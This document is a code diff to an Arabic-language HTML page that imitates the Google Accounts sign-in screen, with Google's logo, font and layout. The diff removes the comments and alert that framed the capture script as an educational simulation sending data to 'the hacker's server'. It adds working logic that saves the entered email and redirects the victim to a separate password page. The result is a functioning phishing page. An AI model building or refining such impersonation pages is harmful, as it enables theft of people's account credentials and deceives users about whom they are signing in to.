@@ -6,7 +6,6 @@
     <title>تسجيل الدخول - حسابات Google</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* إضافة خط يشبه خط جوجل الرسمي */
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
         body { font-family: 'Roboto', arial, sans-serif; }
     </style>
@@ -14,7 +13,6 @@
 <body class="bg-white text-[#202124] flex items-center justify-center min-h-screen">
 
     <div class="w-full max-w-[450px] p-6 sm:p-10 border border-gray-200 rounded-lg shadow-sm">
-        
         <div class="flex justify-center mb-4">
             <svg viewBox="0 0 24 24" width="48" height="48" xmlns="http://www.w3.org/2000/svg">
                 <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
@@ -53,26 +51,16 @@
         </div>
     </div>
 
-    <div class="fixed bottom-4 w-full max-w-[450px] flex justify-between text-xs text-gray-600 px-4">
-        <select class="bg-transparent outline-none cursor-pointer hover:bg-gray-100 p-1 rounded">
-            <option>العربية</option>
-            <option>Français</option>
-            <option>English</option>
-        </select>
-        <div class="space-x-6 space-x-reverse">
-            <a href="#" class="hover:underline">المساعدة</a>
-            <a href="#" class="hover:underline">الخصوصية</a>
-            <a href="#" class="hover:underline">البنود</a>
-        </div>
-    </div>
-
     <script>
-        // سكريبت بسيط لمحاكاة إرسال البيانات (لأغراض تعليمية)
         document.getElementById('nextBtn').addEventListener('click', function() {
             const email = document.getElementById('id_email').value;
             if(email) {
-                console.log("تم اعتراض البيانات: " + email);
-                alert("تقنياً، هنا يتم إرسال الإيميل لـ 'سيرفر الهكر' قبل نقلك لصفحة الباسورد.");
+                // تخزين الإيميل محلياً للربط مع الصفحة الثانية
+                sessionStorage.setItem('temp_email', email);
+                // التوجه لصفحة الباسورد (تأكد أن الملف سميتو password.html)
+                window.location.href = 'password.html';
+            } else {
+                alert("الرجاء إدخال البريد الإلكتروني");
             }
         });
     </script>
